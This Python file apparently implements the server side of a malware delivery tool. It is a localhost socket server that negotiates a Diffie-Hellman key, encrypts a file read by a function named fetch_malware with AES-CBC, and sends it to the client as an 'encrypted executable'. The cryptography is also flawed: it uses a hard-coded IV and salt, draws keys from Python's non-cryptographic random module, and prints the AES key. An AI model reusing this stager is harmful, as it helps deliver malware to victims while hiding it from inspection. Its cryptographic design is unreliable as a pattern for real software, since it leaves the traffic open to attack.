import os
import random
import socket
from sympy import *
import json
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


HOST = '127.0.0.1'  # Symbolic name, meaning all available interfaces
PORT = 65432  # Arbitrary non-privileged port
MAX_BUFFER_SIZE = 4096
DH_KEY_LENGTH = 1024
SALT = b'\x00\x03\x90\xfc\xbfm\xe4\x9e\x9a\xe2K\x04\x0cFaV'
AES_KEY_LENGTH = 256
BLOCKS_LENGTH = 16
IV = b'9\x97\x8fb\xa0\x82\xe1?\xadb\x89\x11,\xcc\xff\t'


def generate_key_pair():
    g = 5

    p = 1
    while not isprime(p):
        p = random.getrandbits(DH_KEY_LENGTH)

    a = random.getrandbits(DH_KEY_LENGTH)

    y = pow(g, a, mod=p)
    return p, g, a, y


def generate_secret(p, g, x, y_client):
    s = (y_client ** x) % p
    return s


def pad_data(data):
    string_data = data.decode('utf-8')
    padded_data = string_data + (BLOCKS_LENGTH - len(string_data) % BLOCKS_LENGTH) * \
        chr(BLOCKS_LENGTH - len(string_data) % BLOCKS_LENGTH)
    return bytes(padded_data, encoding='utf-8')


def unpad_data(data):
    return data[:-ord(data[len(data)-1:])]


def calculate_dh_key(base, secret, mod_prime):
    return pow(int(base), secret, mod=mod_prime)


def calculate_aes_key(dh_key):
    size = int((DH_KEY_LENGTH + 7) / 8)
    return PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=int(AES_KEY_LENGTH / 8),
        salt=SALT,
        iterations=480000
    ).derive(dh_key.to_bytes(size, byteorder='big', signed=False))


def fetch_malware():
    exe_path = ".\\tanuki_the_server\\test_file.txt"
    with open(exe_path, 'rb') as f:
        binary_data = f.read()
        return binary_data


def split_data_for_buffer(data, buffer_size):
    return [data[i:i+buffer_size] for i in range(0, len(data), buffer_size)]


def start_server():
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((HOST, PORT))
    server_socket.listen(1)

    print(f"Server listening on {HOST}:{PORT}")

    while True:
        client_socket, client_address = server_socket.accept()
        print(f"Accepted connection from {client_address[0]}:{client_address[1]}")

        dh_secret = 0
        dh_prime = 0

        while True:
            message = client_socket.recv(MAX_BUFFER_SIZE)

            if not message:
                break

            request = json.loads(message.decode("utf-8"))
            operation = request["Operation"]

            if operation == "keyExchangeGen":
                print(f"Received request for encrypted communication")
                dh_prime, g, dh_secret, y = generate_key_pair()
                response = {"Operation": "keyExchange", "Prime": str(dh_prime), "Generator": str(g), "Gx_server": str(y)}
                print("Sending params for key generation")
                client_socket.sendall(bytes(json.dumps(response), encoding="utf-8"))
            elif operation == "keyExchangeAns":
                print(f"Received params to establish symmetric encryption key")
                dh_key = calculate_dh_key(int(request["Gx_client"]), dh_secret, dh_prime)
                aes_key = calculate_aes_key(dh_key)
                
                #print(f"Computed DH key: {dh_key}")
                print(f"Computed AES key: {aes_key.hex()}")
            

                cipher = Cipher(algorithms.AES(aes_key), modes.CBC(IV))
                encryptor = cipher.encryptor()

                original_text = pad_data(fetch_malware())
                cipher_text = encryptor.update(original_text) + encryptor.finalize()

                split_data = split_data_for_buffer(cipher_text, MAX_BUFFER_SIZE)

                print("Sending encrypted executable")
                for data in split_data:
                    print(data)
                    client_socket.sendall(data)

                client_socket.close()
                break

        print("End request")


if __name__ == "__main__":
    print(IV.hex())
    start_server()
